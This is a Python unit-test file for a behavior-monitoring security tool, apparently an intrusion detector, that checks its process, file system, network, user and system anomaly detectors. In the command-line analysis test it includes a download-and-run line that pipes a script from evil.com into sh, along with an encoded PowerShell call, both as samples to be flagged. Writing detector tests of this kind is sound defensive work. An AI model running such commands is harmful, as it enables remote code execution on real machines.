#!/usr/bin/env python3
"""
Unit tests for Behavior Monitor module
"""

import unittest
from unittest.mock import Mock, patch, MagicMock, call
import json
import os
import sys
import tempfile
import shutil
import time
from datetime import datetime, timedelta
import numpy as np

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from src.modules.behavior_monitor import (
    BehaviorMonitor, ProcessMonitor, FileSystemMonitor, 
    NetworkMonitor, UserMonitor, SystemMonitor
)


class TestProcessMonitor(unittest.TestCase):
    """Test ProcessMonitor class"""
    
    def setUp(self):
        """Set up test cases"""
        # Mock psutil
        self.psutil_patcher = patch('src.modules.behavior_monitor.psutil')
        self.mock_psutil = self.psutil_patcher.start()
        
        self.monitor = ProcessMonitor()
    
    def tearDown(self):
        """Clean up after tests"""
        self.psutil_patcher.stop()
    
    def test_initialization(self):
        """Test monitor initialization"""
        self.assertIsNotNone(self.monitor)
        self.assertEqual(self.monitor.process_baseline, {})
        self.assertEqual(self.monitor.suspicious_processes, [])
    
    @patch('src.modules.behavior_monitor.psutil.process_iter')
    def test_monitor_processes(self, mock_process_iter):
        """Test process monitoring"""
        # Mock process data
        mock_proc1 = Mock()
        mock_proc1.info = {
            'pid': 1234,
            'name': 'test.exe',
            'create_time': time.time() - 60,
            'username': 'testuser',
            'cpu_percent': 10.0,
            'memory_percent': 5.0
        }
        mock_proc1.cmdline.return_value = ['test.exe', '--arg']
        mock_proc1.parent.return_value = Mock(pid=1)
        mock_proc1.children.return_value = []
        mock_proc1.connections.return_value = []
        
        mock_process_iter.return_value = [mock_proc1]
        
        # Monitor processes
        anomalies = self.monitor.monitor()
        
        # Should update baseline
        self.assertIn(1234, self.monitor.process_baseline)
        
        # No anomalies for normal process
        self.assertEqual(len(anomalies), 0)
    
    def test_analyze_command_line(self):
        """Test command line analysis"""
        # Normal command
        normal_cmd = ['python', 'script.py']
        result = self.monitor._analyze_command_line(normal_cmd)
        self.assertIsNone(result)
        
        # Suspicious PowerShell
        suspicious_cmd = ['powershell', '-enc', 'base64string']
        result = self.monitor._analyze_command_line(suspicious_cmd)
        self.assertIsNotNone(result)
        self.assertIn('encoded', result['description'].lower())
        
        # Suspicious curl download
        download_cmd = ['curl', 'http://evil.com/malware.sh', '|', 'sh']
        result = self.monitor._analyze_command_line(download_cmd)
        self.assertIsNotNone(result)
        self.assertIn('download', result['description'].lower())
    
    def test_check_resource_anomalies(self):
        """Test resource anomaly detection"""
        proc_info = {
            'pid': 1234,
            'name': 'miner.exe',
            'cpu_percent': 95.0,
            'memory_percent': 80.0
        }
        
        anomalies = self.monitor._check_resource_anomalies(proc_info)
        
        # Should detect high CPU and memory
        self.assertGreater(len(anomalies), 0)
        cpu_anomaly = next((a for a in anomalies if 'CPU' in a['description']), None)
        self.assertIsNotNone(cpu_anomaly)
    
    def test_check_network_anomalies(self):
        """Test network anomaly detection"""
        # Many connections
        connections = [Mock() for _ in range(150)]
        proc_info = {
            'pid': 1234,
            'name': 'scanner.exe'
        }
        
        anomalies = self.monitor._check_network_anomalies(connections, proc_info)
        
        # Should detect excessive connections
        self.assertGreater(len(anomalies), 0)
        self.assertIn('connections', anomalies[0]['description'].lower())
    
    def test_check_process_creation_rate(self):
        """Test process creation rate detection"""
        # Simulate rapid process creation
        now = time.time()
        parent_pid = 1000
        
        # Add multiple children quickly
        self.monitor.process_creation_times[parent_pid] = [
            now - i for i in range(50)
        ]
        
        proc_info = {
            'pid': parent_pid,
            'name': 'spawner.exe'
        }
        
        result = self.monitor._check_process_creation_rate([], proc_info)
        
        self.assertIsNotNone(result)
        self.assertIn('spawning', result['description'].lower())


class TestFileSystemMonitor(unittest.TestCase):
    """Test FileSystemMonitor class"""
    
    def setUp(self):
        """Set up test cases"""
        self.temp_dir = tempfile.mkdtemp()
        
        # Mock pyinotify
        self.pyinotify_patcher = patch('src.modules.behavior_monitor.pyinotify')
        self.mock_pyinotify = self.pyinotify_patcher.start()
        
        # Mock notifier
        self.mock_notifier = Mock()
        self.mock_pyinotify.Notifier.return_value = self.mock_notifier
        
        self.monitor = FileSystemMonitor([self.temp_dir])
    
    def tearDown(self):
        """Clean up after tests"""
        self.pyinotify_patcher.stop()
        shutil.rmtree(self.temp_dir)
    
    def test_initialization(self):
        """Test monitor initialization"""
        self.assertIsNotNone(self.monitor)
        self.assertEqual(self.monitor.monitored_paths, [self.temp_dir])
        self.assertEqual(self.monitor.file_events, [])
    
    def test_process_event(self):
        """Test event processing"""
        # Create mock event
        event = Mock()
        event.maskname = 'IN_CREATE'
        event.pathname = os.path.join(self.temp_dir, 'test.exe')
        event.dir = False
        
        # Process event
        self.monitor.process_default(event)
        
        # Check event was recorded
        self.assertEqual(len(self.monitor.file_events), 1)
        self.assertEqual(self.monitor.file_events[0]['path'], event.pathname)
        self.assertEqual(self.monitor.file_events[0]['type'], 'CREATE')
    
    def test_analyze_events(self):
        """Test event analysis"""
        # Add some events
        base_time = datetime.now()
        
        # Suspicious executable creation
        self.monitor.file_events.append({
            'type': 'CREATE',
            'path': '/tmp/malware.exe',
            'timestamp': base_time.isoformat()
        })
        
        # Ransomware-like behavior
        for i in range(15):
            self.monitor.file_events.append({
                'type': 'MODIFY',
                'path': f'/home/user/doc{i}.txt',
                'timestamp': (base_time + timedelta(seconds=i)).isoformat()
            })
        
        anomalies = self.monitor.analyze_events()
        
        # Should detect anomalies
        self.assertGreater(len(anomalies), 0)
        
        # Check for executable creation
        exe_anomaly = next((a for a in anomalies if 'executable' in a['description'].lower()), None)
        self.assertIsNotNone(exe_anomaly)
    
    def test_monitor(self):
        """Test monitoring function"""
        # Mock notifier methods
        self.mock_notifier.check_events.return_value = False
        self.mock_notifier.process_events.return_value = None
        
        # Run monitor briefly
        result = self.monitor.monitor(duration=0.1)
        
        # Should return empty list if no events
        self.assertEqual(result, [])
        
        # Verify notifier was used
        self.mock_notifier.check_events.assert_called()


class TestNetworkMonitor(unittest.TestCase):
    """Test NetworkMonitor class"""
    
    def setUp(self):
        """Set up test cases"""
        # Mock psutil
        self.psutil_patcher = patch('src.modules.behavior_monitor.psutil')
        self.mock_psutil = self.psutil_patcher.start()
        
        self.monitor = NetworkMonitor()
    
    def tearDown(self):
        """Clean up after tests"""
        self.psutil_patcher.stop()
    
    def test_initialization(self):
        """Test monitor initialization"""
        self.assertIsNotNone(self.monitor)
        self.assertEqual(self.monitor.connection_baseline, {})
        self.assertEqual(self.monitor.port_scan_detection, {})
    
    @patch('src.modules.behavior_monitor.psutil.net_connections')
    def test_monitor(self, mock_net_connections):
        """Test network monitoring"""
        # Mock connections
        conn1 = Mock()
        conn1.laddr = Mock(ip='127.0.0.1', port=8080)
        conn1.raddr = Mock(ip='8.8.8.8', port=443)
        conn1.status = 'ESTABLISHED'
        conn1.pid = 1234
        
        conn2 = Mock()
        conn2.laddr = Mock(ip='0.0.0.0', port=22)
        conn2.raddr = None
        conn2.status = 'LISTEN'
        conn2.pid = 5678
        
        mock_net_connections.return_value = [conn1, conn2]
        
        # Monitor connections
        anomalies = self.monitor.monitor()
        
        # Should update baseline
        self.assertIn('127.0.0.1:8080', self.monitor.connection_baseline)
    
    def test_detect_port_scanning(self):
        """Test port scanning detection"""
        # Simulate port scan attempts
        source_ip = '192.168.1.100'
        now = time.time()
        
        # Add many failed connections from same IP
        for port in range(1000, 1020):
            conn = Mock()
            conn.laddr = Mock(ip='192.168.1.1', port=port)
            conn.raddr = Mock(ip=source_ip, port=12345)
            conn.status = 'SYN_RECV'
            
            self.monitor.port_scan_detection[source_ip] = self.monitor.port_scan_detection.get(source_ip, [])
            self.monitor.port_scan_detection[source_ip].append(now)
        
        # Check for port scan
        result = self.monitor._detect_port_scanning()
        
        self.assertIsNotNone(result)
        self.assertIn('port scan', result['description'].lower())
        self.assertIn(source_ip, result['description'])
    
    def test_detect_unusual_connections(self):
        """Test unusual connection detection"""
        connections = []
        
        # Unusual port connection
        unusual_conn = Mock()
        unusual_conn.laddr = Mock(ip='192.168.1.1', port=31337)
        unusual_conn.raddr = Mock(ip='10.0.0.1', port=9999)
        unusual_conn.status = 'ESTABLISHED'
        unusual_conn.pid = 1234
        connections.append(unusual_conn)
        
        anomalies = self.monitor._detect_unusual_connections(connections)
        
        # Should detect unusual ports
        self.assertGreater(len(anomalies), 0)
        self.assertIn('unusual', anomalies[0]['description'].lower())


class TestUserMonitor(unittest.TestCase):
    """Test UserMonitor class"""
    
    def setUp(self):
        """Set up test cases"""
        self.monitor = UserMonitor()
    
    def test_initialization(self):
        """Test monitor initialization"""
        self.assertIsNotNone(self.monitor)
        self.assertEqual(self.monitor.user_baseline, {})
        self.assertEqual(self.monitor.login_history, {})
    
    @patch('subprocess.run')
    @patch('src.modules.behavior_monitor.pwd.getpwall')
    def test_monitor(self, mock_getpwall, mock_run):
        """Test user monitoring"""
        # Mock user data
        user1 = Mock()
        user1.pw_name = 'testuser'
        user1.pw_uid = 1000
        user1.pw_gid = 1000
        user1.pw_shell = '/bin/bash'
        
        mock_getpwall.return_value = [user1]
        
        # Mock last command output
        mock_run.return_value = Mock(
            stdout='testuser pts/0 192.168.1.100 Wed May 29 10:00 still logged in\n',
            returncode=0
        )
        
        # Monitor users
        anomalies = self.monitor.monitor()
        
        # Should update baseline
        self.assertIn('testuser', self.monitor.user_baseline)
    
    def test_detect_privilege_changes(self):
        """Test privilege change detection"""
        # Set baseline
        self.monitor.user_baseline['testuser'] = {
            'uid': 1000,
            'gid': 1000,
            'shell': '/bin/bash'
        }
        
        # Current user with changed shell
        users = [Mock(
            pw_name='testuser',
            pw_uid=1000,
            pw_gid=1000,
            pw_shell='/bin/sh'  # Changed
        )]
        
        anomalies = self.monitor._detect_privilege_changes(users)
        
        # Should detect shell change
        self.assertEqual(len(anomalies), 1)
        self.assertIn('shell', anomalies[0]['description'].lower())
    
    def test_detect_unusual_logins(self):
        """Test unusual login detection"""
        # Add login history
        self.monitor.login_history['testuser'] = [
            {'time': datetime.now() - timedelta(hours=2), 'from': '192.168.1.100'},
            {'time': datetime.now() - timedelta(hours=1), 'from': '192.168.1.100'}
        ]
        
        # Current login from different location
        current_logins = [
            {'user': 'testuser', 'from': '10.0.0.1', 'time': datetime.now()}
        ]
        
        anomalies = self.monitor._detect_unusual_logins(current_logins)
        
        # Should detect unusual location
        self.assertEqual(len(anomalies), 1)
        self.assertIn('location', anomalies[0]['description'].lower())


class TestSystemMonitor(unittest.TestCase):
    """Test SystemMonitor class"""
    
    def setUp(self):
        """Set up test cases"""
        # Mock psutil
        self.psutil_patcher = patch('src.modules.behavior_monitor.psutil')
        self.mock_psutil = self.psutil_patcher.start()
        
        self.monitor = SystemMonitor()
    
    def tearDown(self):
        """Clean up after tests"""
        self.psutil_patcher.stop()
    
    def test_initialization(self):
        """Test monitor initialization"""
        self.assertIsNotNone(self.monitor)
        self.assertGreater(len(self.monitor.resource_history), 0)
    
    def test_monitor(self):
        """Test system monitoring"""
        # Mock system metrics
        self.mock_psutil.cpu_percent.return_value = 50.0
        self.mock_psutil.virtual_memory.return_value = Mock(percent=60.0)
        self.mock_psutil.disk_io_counters.return_value = Mock(
            read_bytes=1000000,
            write_bytes=2000000
        )
        self.mock_psutil.net_io_counters.return_value = Mock(
            bytes_sent=3000000,
            bytes_recv=4000000
        )
        
        # Monitor system
        anomalies = self.monitor.monitor()
        
        # Should update history
        self.assertGreater(len(self.monitor.resource_history), 1)
    
    def test_detect_resource_anomalies(self):
        """Test resource anomaly detection"""
        # Add normal baseline
        for i in range(10):
            self.monitor.resource_history.append({
                'timestamp': datetime.now() - timedelta(minutes=i),
                'cpu': 20.0,
                'memory': 30.0,
                'disk_read': 1000,
                'disk_write': 1000,
                'net_sent': 1000,
                'net_recv': 1000
            })
        
        # Current high usage
        current = {
            'cpu': 95.0,  # Anomaly
            'memory': 90.0,  # Anomaly
            'disk_read': 1000,
            'disk_write': 1000,
            'net_sent': 1000,
            'net_recv': 1000
        }
        
        anomalies = self.monitor._detect_resource_anomalies(current)
        
        # Should detect CPU and memory anomalies
        self.assertGreater(len(anomalies), 0)
        cpu_anomaly = next((a for a in anomalies if 'CPU' in a['description']), None)
        self.assertIsNotNone(cpu_anomaly)


class TestBehaviorMonitor(unittest.TestCase):
    """Test BehaviorMonitor class"""
    
    def setUp(self):
        """Set up test cases"""
        self.temp_dir = tempfile.mkdtemp()
        self.config = {
            'process_monitoring': {'enabled': True},
            'file_monitoring': {
                'enabled': True,
                'paths': [self.temp_dir]
            },
            'network_monitoring': {'enabled': True},
            'user_monitoring': {'enabled': True},
            'system_monitoring': {'enabled': True},
            'ml_detection': {
                'enabled': True,
                'model_path': os.path.join(self.temp_dir, 'model.pkl')
            }
        }
        
        # Mock all sub-monitors
        with patch('src.modules.behavior_monitor.ProcessMonitor'):
            with patch('src.modules.behavior_monitor.FileSystemMonitor'):
                with patch('src.modules.behavior_monitor.NetworkMonitor'):
                    with patch('src.modules.behavior_monitor.UserMonitor'):
                        with patch('src.modules.behavior_monitor.SystemMonitor'):
                            self.monitor = BehaviorMonitor(self.config)
    
    def tearDown(self):
        """Clean up after tests"""
        shutil.rmtree(self.temp_dir)
    
    def test_initialization(self):
        """Test monitor initialization"""
        self.assertIsNotNone(self.monitor)
        self.assertIsNotNone(self.monitor.process_monitor)
        self.assertIsNotNone(self.monitor.file_monitor)
        self.assertIsNotNone(self.monitor.network_monitor)
        self.assertIsNotNone(self.monitor.user_monitor)
        self.assertIsNotNone(self.monitor.system_monitor)
    
    def test_analyze(self):
        """Test main analyze function"""
        # Mock monitor results
        self.monitor.process_monitor.monitor.return_value = [
            {'type': 'process', 'severity': 'high'}
        ]
        self.monitor.file_monitor.monitor.return_value = [
            {'type': 'file', 'severity': 'medium'}
        ]
        self.monitor.network_monitor.monitor.return_value = []
        self.monitor.user_monitor.monitor.return_value = []
        self.monitor.system_monitor.monitor.return_value = []
        
        # Run analysis
        results = self.monitor.analyze()
        
        # Verify results
        self.assertIn('behavior_anomalies', results)
        self.assertEqual(len(results['behavior_anomalies']), 2)
        self.assertIn('risk_score', results)
        self.assertIn('ml_predictions', results)
    
    def test_aggregate_anomalies(self):
        """Test anomaly aggregation"""
        anomalies = [
            {'type': 'process', 'severity': 'high', 'entity': 'test.exe'},
            {'type': 'network', 'severity': 'medium', 'entity': '192.168.1.1'},
            {'type': 'process', 'severity': 'low', 'entity': 'test.exe'}
        ]
        
        aggregated = self.monitor._aggregate_anomalies(anomalies)
        
        # Should group by entity
        self.assertEqual(len(aggregated), 2)
        
        # Check aggregation
        test_exe = next((a for a in aggregated if a['entity'] == 'test.exe'), None)
        self.assertIsNotNone(test_exe)
        self.assertEqual(test_exe['anomaly_count'], 2)
        self.assertEqual(test_exe['max_severity'], 'high')
    
    def test_calculate_risk_score(self):
        """Test risk score calculation"""
        anomalies = [
            {'severity': 'critical'},
            {'severity': 'high'},
            {'severity': 'medium'},
            {'severity': 'low'}
        ]
        
        risk_score = self.monitor._calculate_risk_score(anomalies)
        
        # Should be between 0 and 1
        self.assertGreater(risk_score, 0)
        self.assertLessEqual(risk_score, 1.0)
    
    def test_extract_features_for_ml(self):
        """Test ML feature extraction"""
        anomalies = [
            {'type': 'process', 'severity': 'high'},
            {'type': 'network', 'severity': 'medium'},
            {'type': 'file', 'severity': 'low'}
        ]
        
        features = self.monitor._extract_features_for_ml(anomalies)
        
        # Check feature vector
        self.assertIsInstance(features, np.ndarray)
        self.assertEqual(features.shape[0], 10)  # 10 features
    
    @patch('joblib.dump')
    def test_train_model(self, mock_dump):
        """Test model training"""
        # Create training data
        data = [
            {'anomalies': [{'type': 'process', 'severity': 'high'}], 'label': 'malicious'},
            {'anomalies': [{'type': 'network', 'severity': 'low'}], 'label': 'benign'}
        ]
        
        # Train model
        self.monitor.train_model(data)
        
        # Verify model was saved
        mock_dump.assert_called_once()
    
    def test_monitor_continuous(self):
        """Test continuous monitoring"""
        # This would test the continuous monitoring loop
        # In practice, we'd need to mock threading and time
        pass


if __name__ == '__main__':
    unittest.main()